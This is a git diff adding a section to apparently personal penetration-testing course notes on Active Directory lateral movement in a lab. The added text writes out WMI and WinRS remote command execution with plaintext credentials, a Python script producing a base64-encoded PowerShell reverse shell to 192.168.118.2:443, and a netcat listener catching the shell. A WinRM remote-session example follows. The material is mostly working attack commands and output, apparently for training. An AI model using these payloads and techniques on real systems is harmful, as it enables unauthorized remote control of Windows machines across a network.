@@ -2536,8 +2536,92 @@ Reference
     [*] Using the DRSUAPI method to get NTDS.DIT secrets
     dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
     ```
+    
+### 24. Lateral movement in active directory  
+- WMI and WinRM
+  - **WMI need a member of local admin group**  
+  - communicate over RPC port 135  
+  - use **wmic** utility to spawn a process on a remote system > ProcessId = 5772 (win32calc.exe process appear with jen)  
+    `C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"`
+  - create PSCredential object in PowerShell  
+    ```
+    $username = 'jen';
+    $password = 'Nexus123!';
+    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+    ```
+  - create a new CimSession  
+    ```
+    $options = New-CimSessionOption -Protocol DCOM
+    $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+    $command = 'calc';
+    ```
+  - invoke WMI session through PowerShell  
+    ```
+    PS C:\Users\jeff> $username = 'jen';
+    ...
+    PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+    ```
+  - Verifying the active processes on the targt machine (task manager)  
+  - Executing the WMI PowerShell payload  
+    ```
+    import sys
+    import base64
+
+    payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+    print(cmd)
+    ```
+  -  Running the base64 encoder Python script  
+     `kali@kali:~$ python3 encode.py`
+  -  Move to client74 machine and run the PowerShell WMI script with the newly generated encoded reverse shell payload  
+     ```
+     PS C:\Users\jeff> $username = 'jen';
+     PS C:\Users\jeff> $password = 'Nexus123!';
+     PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+     PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+     PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+     PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+
+     PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+     HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+
+     PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+     ```
+  -  switch to kali listener  
+     ```
+     kali@kali:~$ nc -lnvp 443
+     connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855
+
+     PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
+     FILES04
+     ```
+  -  Executing commands remotely via WinRS    
+     `C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"`
+  -  Running the reverse-shell payload through WinRS  
+     `C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
+  - Establishing a PowerShell Remote Session via WinRM  
+    ```
+    PS C:\Users\jeff> $username = 'jen';
+    PS C:\Users\jeff> $password = 'Nexus123!';
+    PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+    PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+    PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+    ```
+  - To interact with the session  
+    `PS C:\Users\jeff> Enter-PSSession 1`
+- PsExec
+- Pass the Hash
+- Overpass the Hash
+- Pass the Ticket
+- DCOM
+- Golden Ticket
+- Shadow Copies
   
-### 24. Lateral movement in active directory
 ### 25. Enumerating AWS Cloud Infrastruture
 ### 26. Attacking AWS cloud infrastruture 
 ### 27. Assembling the pieces
